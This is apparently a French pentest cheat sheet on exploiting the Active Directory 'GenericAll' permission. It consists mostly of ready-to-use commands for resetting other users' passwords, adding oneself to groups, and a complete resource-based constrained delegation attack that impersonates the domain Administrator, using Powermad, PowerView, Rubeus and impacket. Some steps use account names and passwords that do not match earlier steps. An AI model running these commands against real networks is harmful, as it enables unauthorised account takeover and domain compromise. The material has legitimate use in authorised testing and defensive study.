Le droit `GenericAll` permet un contrôle total sur l'objet cible. Il peut être appliqué à des utilisateurs, des groupes ou des machines. Voici comment exploiter ce droit dans différents contextes :

### 📝GenericAll sur un Utilisateur

Si un utilisateur a le droit `GenericAll` sur un autre utilisateur, il est possible de réinitialiser le mot de passe de l'utilisateur cible.

#### 🍔 Depuis Windows

Utilisez la commande suivante pour réinitialiser le mot de passe d'un utilisateur depuis un environnement Windows :

```powershell
net user $userCible $nouveauPassword /domain
```

#### 🐧 Depuis Linux

Depuis un environnement Linux, vous pouvez utiliser la commande suivante :

```bash
net rpc user password $userCible $nouveauPass -U domain.local/$noreUser -S $dc
```

> Mettre un mot de passe en adéquation avec la politique de mot de passe du domaine, sinon celui-ci ne sera pas attribué et rien ne nous l'indique.

---
### 📝 GenericAll sur un Groupe

Si un utilisateur a le droit `GenericAll` sur un groupe, il peut s'ajouter en tant que membre de ce groupe.

#### 🍔 Depuis Windows

Utilisez les commandes suivantes pour ajouter un utilisateur à un groupe depuis un environnement Windows :

```powershell
net group "$groupeCible" $userCible /add /domain #cmd
Add-ADGroupMember -Identity "$groupeCible" -Members $userCible #powershell
Add-ADGroupMember -Identity "$groupeCible" -Members $userCible #powersploit
```

---
### 📝 GenericAll sur une Machine

Le droit `GenericAll` sur une machine permet d'abuser de la Resource-Based Constrained Delegation (RBCD).

#### 🍔 Depuis Windows

Pour exploiter ce droit, nous avons besoin des scripts `powermad.ps1` et `powerview`.

Création d'un compte machine :

```powershell
import-module powermad
New-MachineAccount -MachineAccount paked -Password $(ConvertTo-SecureString 'Sup3P4ssw0rd!' -AsPlainText -Force) -Verbose
```

Vérification de la création du compte :

```powershell
Get-DomainComputer
```

Écriture de la propriété `msds-allowedtoactonbehalfofotheridentity` sur le compte machine cible :

```powershell
$ComputerSid = Get-DomainComputer paked -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer $cible | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Récupération du hash du compte machine créé :

```
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Récupération du ticket de l'utilisateur ayant des droits sur le compte machine cible :

```powershell
rubeus.exe s4u /user:paked$ /aes256:<aes256> /aes128:<aes128> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/cible /domain:domain.local /ptt /altservice:http/cible
```

#### 🐧 Depuis Linux

Création d'un compte machine :

```bash
impacket-addcomputer -computer-name 'COMPUTER$' -computer-pass '$password' -dc-host $dc -domain-netbios $DOMAIN 'domain.local\$user:$password'
```

Écriture de la propriété `msds-allowedtoactonbehalfofotheridentity` sur le compte machine cible :

```bash
impacket-rbcd -delegate-from 'paked$' -delegate-to 'cible$' -dc-ip '$dc$' -action 'write' 'domain.local'/'$utilisateur':'$Password'
```

Récupération du ticket de l'utilisateur ayant des droits sur le compte machine cible :

```bash
impacket-getST -spn 'cifs/$cible' -impersonate Administrator -dc-ip '$dc' 'domain.local/paked$:$password'
```
